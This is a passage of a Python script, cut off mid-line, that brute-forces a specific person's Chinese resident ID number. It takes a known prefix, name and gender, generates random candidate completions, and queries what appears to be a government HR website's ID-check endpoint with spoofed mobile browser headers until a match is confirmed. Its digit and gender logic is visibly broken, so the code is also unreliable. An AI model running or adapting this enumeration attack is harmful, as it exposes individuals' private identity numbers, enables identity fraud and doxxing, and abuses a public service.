import random
import requests
import asyncio
import aiohttp
import hashlib

# 获取用户输入
idcard_prefix = input("身份证号码前14位：")
name = input("姓名：")
gender = input("性别（男/女）：")

# 性别判断和第17位生成
if gender.lower() == "男":
    idcard_17th = str(random.randint(1, 9))
elif gender.lower() == "女":
    idcard_17th = str(random.randint(0, 8))
else:
    print("性别输入错误，请输入'男'或'女'")
    exit()


# 生成校验码函数（基于身份证校验规则）
def calculate_checksum(id_number):
    weights = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    checksum_list = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
    total = sum(int(id_number[i]) * weights[i] for i in range(17))
    return checksum_list[total % 11]


# 缓存已验证过的号码
verified_cache = {}


# 异步请求函数
async def verify_idcard(session, idcard):
    if idcard in verified_cache:
        print(f"身份证号码 {idcard} 已缓存结果: {verified_cache[idcard]}")
        return verified_cache[idcard]

    headers = {
        'Host': 'www.renshenet.org.cn',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'same-origin',
        'depCode': '0004',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://www.renshenet.org.cn',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Referer': 'https://www.renshenet.org.cn/jxzhrsdist/index.html',
        'Content-Length': '47',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty'
    }

    data = {
        "idcard": idcard,
        "name": name
    }

    try:
        async with session.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
                                json=data) as response:
            result = await response.json()
            if result["data"]["isSucces"]:
                print(f"身份证号码 {idcard} ✅验证通过")
                verified_cache[idcard] = True
            else:
                print(f"身份证号码 {idcard} ❌验证未通过")
                verified_cache[idcard] = False
    except Exception as e:
        print(f"请求错误: {e}")
        verified_cache[idcard] = False


# 主异步函数
async def main():
    idcard_suffixes = [str(random.randint(0, 999)).zfill(3) for _ in range(100)]
    async with aiohttp.ClientSession() as session:
        tasks = []
        for suffix in idcard_suffixes:
            idcard_without_checksum = idcard_prefix + idcard_17th + suffix
            checksum = calcula
